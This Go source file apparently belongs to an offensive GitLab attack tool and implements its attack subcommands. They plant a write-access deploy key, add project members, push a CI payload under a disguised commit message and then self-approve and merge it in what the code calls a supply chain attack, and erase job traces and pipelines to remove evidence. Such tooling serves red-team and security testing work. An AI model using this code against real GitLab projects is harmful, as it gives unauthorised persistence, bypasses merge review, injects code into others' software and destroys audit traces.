package cmd

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/mr-pmillz/gogatoz/pkg/attack"
	"github.com/mr-pmillz/gogatoz/pkg/gitlabx"
	"github.com/spf13/cobra"
)

// runAttackDeployKey creates a deploy key with write access on the target project.
func runAttackDeployKey(ctx context.Context, cmd *cobra.Command, client *gitlabx.Client) error {
	if strings.TrimSpace(atkKeyPath) == "" {
		return fmt.Errorf("--key-path is required when using --deploy-key")
	}
	att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
	pers := attack.NewPersistence(att)
	keyID, pubKey, err := pers.CreateDeployKey(ctx, atkTarget, atkKeyTitle, atkKeyPath)
	if err != nil {
		return err
	}
	if outputJSON {
		b, _ := json.MarshalIndent(struct {
			DeployKeyID    int64  `json:"deploy_key_id"`
			PublicKey      string `json:"public_key"`
			PrivateKeyPath string `json:"private_key_path"`
		}{DeployKeyID: keyID, PublicKey: strings.TrimSpace(pubKey), PrivateKeyPath: atkKeyPath}, "", "  ")
		_, err = fmt.Fprintln(cmd.OutOrStdout(), string(b))
		return err
	}
	renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Deploy key created (ID: %d)", keyID))
	renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Public key: %s", strings.TrimSpace(pubKey)))
	renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Private key saved to: %s", atkKeyPath))
	return nil
}

// runAttackAddMember adds a user as project member.
func runAttackAddMember(ctx context.Context, cmd *cobra.Command, client *gitlabx.Client) error {
	if strings.TrimSpace(atkMemberUser) == "" {
		return fmt.Errorf("--member-username is required when using --add-member")
	}
	att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
	pers := attack.NewPersistence(att)
	if err := pers.AddProjectMemberByUsername(ctx, atkTarget, atkMemberUser, atkMemberRole); err != nil {
		return err
	}
	role := atkMemberRole
	if role == "" {
		role = "developer"
	}
	if outputJSON {
		b, _ := json.MarshalIndent(struct {
			Username    string `json:"username"`
			AccessLevel string `json:"access_level"`
		}{Username: atkMemberUser, AccessLevel: role}, "", "  ")
		_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
		return err
	}
	renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Added %s as %s to project", atkMemberUser, role))
	return nil
}

type cleanupAction struct {
	Action  string `json:"action"`
	Target  string `json:"target,omitempty"`
	Success bool   `json:"success"`
	Error   string `json:"error,omitempty"`
}

func cleanupCIFile(ctx context.Context, att *attack.Attacker, target, branch string) cleanupAction {
	if branch == "" {
		branch = gogatozAttack
	}
	err := att.DeleteFile(ctx, target, branch, ".gitlab-ci.yml", "Remove CI file via GoGatoZ")
	ca := cleanupAction{Action: "delete-ci-file", Target: branch, Success: err == nil}
	if err != nil {
		ca.Error = err.Error()
	}
	return ca
}

func cleanupBranch(ctx context.Context, att *attack.Attacker, target, branch string) cleanupAction {
	err := att.DeleteBranch(ctx, target, branch)
	ca := cleanupAction{Action: "delete-branch", Target: branch, Success: err == nil}
	if err != nil {
		ca.Error = err.Error()
	}
	return ca
}

func cleanupDeployKey(ctx context.Context, att *attack.Attacker, target string, keyID int64) cleanupAction {
	err := att.RevokeDeployKey(ctx, target, keyID)
	ca := cleanupAction{Action: "revoke-deploy-key", Target: fmt.Sprintf("%d", keyID), Success: err == nil}
	if err != nil {
		ca.Error = err.Error()
	}
	return ca
}

func cleanupMember(ctx context.Context, att *attack.Attacker, target string, memberID int64) cleanupAction {
	err := att.RemoveProjectMember(ctx, target, memberID)
	ca := cleanupAction{Action: "remove-member", Target: fmt.Sprintf("%d", memberID), Success: err == nil}
	if err != nil {
		ca.Error = err.Error()
	}
	return ca
}

func cleanupPipeline(ctx context.Context, att *attack.Attacker, target string, pipelineID int64) cleanupAction {
	err := att.DeletePipeline(ctx, target, pipelineID)
	ca := cleanupAction{Action: "delete-pipeline", Target: fmt.Sprintf("%d", pipelineID), Success: err == nil}
	if err != nil {
		ca.Error = err.Error()
	}
	return ca
}

func cleanupJobTraces(ctx context.Context, att *attack.Attacker, target, ref string, maxPipelines int, deletePipelines bool) cleanupAction {
	if maxPipelines <= 0 {
		maxPipelines = 5
	}
	count, err := att.EraseRecentPipelines(ctx, target, ref, maxPipelines, deletePipelines)
	verb := "erase-job-traces"
	if deletePipelines {
		verb = "erase-and-delete-pipelines"
	}
	ca := cleanupAction{Action: verb, Target: fmt.Sprintf("%d pipelines", count), Success: err == nil}
	if err != nil {
		ca.Error = err.Error()
	}
	return ca
}

// runAttackCleanup removes attack artifacts (branches, CI files, deploy keys, members, pipelines).
func runAttackCleanup(ctx context.Context, cmd *cobra.Command, client *gitlabx.Client) error {
	att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
	_, _ = att.SetupUser(ctx)
	var actions []cleanupAction

	if atkCleanupCI {
		actions = append(actions, cleanupCIFile(ctx, att, atkTarget, strings.TrimSpace(atkBranch)))
	}
	if strings.TrimSpace(atkCleanupBranch) != "" {
		actions = append(actions, cleanupBranch(ctx, att, atkTarget, strings.TrimSpace(atkCleanupBranch)))
	}
	if atkRevokeDeployKey > 0 {
		actions = append(actions, cleanupDeployKey(ctx, att, atkTarget, atkRevokeDeployKey))
	}
	if atkRemoveMemberID > 0 {
		actions = append(actions, cleanupMember(ctx, att, atkTarget, atkRemoveMemberID))
	}
	if atkCleanupPipeline > 0 {
		actions = append(actions, cleanupPipeline(ctx, att, atkTarget, atkCleanupPipeline))
	}
	if atkCleanupJobs {
		actions = append(actions, cleanupJobTraces(ctx, att, atkTarget, atkCleanupJobsRef, atkCleanupJobsMax, atkCleanupJobsDelete))
	}

	if outputJSON {
		b, err := json.MarshalIndent(struct {
			Actions []cleanupAction `json:"actions"`
		}{Actions: actions}, "", "  ")
		if err != nil {
			return err
		}
		_, err = fmt.Fprintln(cmd.OutOrStdout(), string(b))
		return err
	}
	for _, a := range actions {
		if a.Success {
			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("%s %s", a.Action, a.Target))
		} else {
			renderError(cmd.OutOrStdout(), fmt.Sprintf("%s %s: %s", a.Action, a.Target, a.Error))
		}
	}
	return nil
}

// runAttackAutoMerge creates an MR, self-approves, and merges (supply chain attack).
func runAttackAutoMerge(ctx context.Context, cmd *cobra.Command, client *gitlabx.Client) error {
	att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
	pers := attack.NewPersistence(att)

	// Resolve CI content or use a simple file modification
	filePath := strings.TrimSpace(atkAutoMergeFile)
	if filePath == "" {
		filePath = ".gitlab-ci.yml"
	}
	var content string
	if strings.TrimSpace(atkPayload) != "" {
		var perr error
		content, perr = renderPayload()
		if perr != nil {
			return perr
		}
	} else {
		ci, lerr := loadCIContent(atkCIInline, atkCIFile, atkCIStdin)
		if lerr != nil {
			return lerr
		}
		content = ci
	}
	if strings.TrimSpace(content) == "" {
		return fmt.Errorf("provide content via --ci-yaml, --ci-file, --ci-stdin, or --payload for --auto-merge")
	}

	if strings.TrimSpace(atkBranch) == "" {
		atkBranch = attack.GogatozAttacks
	}
	finalBranch, berr := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
	if berr != nil {
		return berr
	}

	msg := strings.TrimSpace(atkMessage)
	if msg == "" {
		msg = "chore: update configuration"
	}
	mrTitle := strings.TrimSpace(atkMRTitle)
	if mrTitle == "" {
		mrTitle = "Update project configuration"
	}

	result, err := pers.RunAutoMerge(ctx, atkTarget,
		finalBranch, filePath, content, msg,
		mrTitle, atkMRDescription, atkMRTargetBranch)
	if err != nil && result == nil {
		return err
	}

	if outputJSON {
		b, _ := json.MarshalIndent(result, "", "  ")
		_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
		return err
	}
	renderInfo(cmd.OutOrStdout(), fmt.Sprintf("MR: %s (IID %d)", result.MRURL, result.MRIID))
	renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Approvals required: %d, left: %d", result.Approval.ApprovalsRequired, result.Approval.ApprovalsLeft))
	if result.Approved {
		renderSuccess(cmd.OutOrStdout(), "Self-approved")
	} else if result.ApproveErr != "" {
		renderError(cmd.OutOrStdout(), fmt.Sprintf("Approve failed: %s", result.ApproveErr))
	}
	if result.Merged {
		renderSuccess(cmd.OutOrStdout(), "Merged to default branch")
	} else if result.MergeErr != "" {
		renderError(cmd.OutOrStdout(), fmt.Sprintf("Merge failed: %s", result.MergeErr))
	}
	return nil
}
